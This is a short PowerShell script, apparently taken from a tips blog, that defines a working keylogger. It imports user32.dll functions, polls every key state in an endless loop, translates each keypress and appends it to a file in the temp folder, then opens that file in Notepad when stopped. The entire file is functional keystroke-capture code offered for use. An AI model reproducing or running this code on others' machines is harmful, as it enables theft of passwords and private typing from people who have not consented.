#requires -Version 2 
function Start-KeyLogger($Path = "$env:temp\keylogger.txt")
{
	<#
	.DESCRIPTION
		By accessing the Windows low-level API functions, a script can constantly
		monitor the keyboard for keypresses and log these to a file. This effectively produces a keylogger.

		Run the function Start-Keylogger to start logging key presses. Once you
		stop the script by pressing CTRL+C, the collected key presses are displayed

	.NOTES
		http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx
	#>
	# Signatures for API Calls
	$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

	# load signatures and make members available
	$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

	# create output file
	$null = New-Item -Path $Path -ItemType File -Force

	try
	{
		Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

		# create endless loop. When user presses CTRL+C, finally-block
		# executes and shows the collected key presses
		while ($true)
		{
			Start-Sleep -Milliseconds 40

			# scan all ASCII codes above 8
			for ($ascii = 9; $ascii -le 254; $ascii++)
			{
				# get current key state
				$state = $API::GetAsyncKeyState($ascii)

				# is key pressed?
				if ($state -eq -32767)
				{
					$null = [console]::CapsLock

					# translate scan code to real code
					$virtualKey = $API::MapVirtualKey($ascii, 3)

					# get keyboard state for virtual keys
					$kbstate = New-Object Byte[] 256
					$checkkbstate = $API::GetKeyboardState($kbstate)

					# prepare a StringBuilder to receive input key
					$mychar = New-Object -TypeName System.Text.StringBuilder

					# translate virtual key
					$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

					if ($success)
					{
						# add key to logger file
						[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
					}
				}
			}
		}
	}
	finally
	{
		# open logger file in Notepad
		notepad $Path
	}
}

# records all key presses until script is aborted by pressing CTRL+C 
# will then open the file with collected key codes 
#Start-KeyLogger